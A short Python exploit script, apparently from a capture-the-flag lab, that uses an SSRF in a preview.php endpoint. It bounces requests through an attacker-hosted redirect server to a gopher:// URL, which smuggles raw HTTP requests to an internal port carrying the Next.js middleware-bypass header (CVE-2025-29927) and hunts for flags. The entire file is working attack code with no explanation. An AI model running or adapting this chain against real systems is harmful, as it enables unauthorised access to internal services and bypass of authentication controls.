import requests, urllib.parse, re

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

# Gopher payload: raw HTTP request to 127.0.0.1:10000 with CVE header
# x-middleware-subrequest: middleware  (CVE-2025-29927)
# Try different header values since the path depends on middleware file location
gopher_paths = []

for header_val in [
    'middleware',
    'src/middleware',
    'middleware:middleware:middleware',
    'src/middleware:src/middleware:src/middleware',
    'middleware:middleware',
]:
    for path in ['/customapi', '/admin', '/flag', '/secret']:
        raw_request = (
            f'GET {path} HTTP/1.1\r\n'
            f'Host: 127.0.0.1:10000\r\n'
            f'x-middleware-subrequest: {header_val}\r\n'
            f'Connection: close\r\n'
            f'\r\n'
        )
        # Gopher format: gopher://host:port/_<urlencoded_request>
        encoded = urllib.parse.quote(raw_request, safe='')
        gopher_url = f'gopher://127.0.0.1:10000/_{encoded}'
        redirect_url = attacker + '/redirect?to=' + urllib.parse.quote(gopher_url, safe='')

        try:
            r = requests.get(base + urllib.parse.quote(redirect_url, safe=''), timeout=8)
            body = r.text.strip()
            if body and len(body) > 0:
                flags = re.findall(r'THM\{[^}]+\}', body)
                if flags:
                    print(f'[FLAG!!!] header={header_val} path={path}: {flags}')
                elif len(body) < 7000:  # not a 404 page
                    print(f'[HIT {len(body)}b] header={header_val}, path={path}')
                    print(body[:300])
                else:
                    print(f'[404?] header={header_val}, path={path} ({len(body)}b)')
            else:
                print(f'[EMPTY] header={header_val}, path={path}')
        except Exception as e:
            print(f'[ERR] {e}')
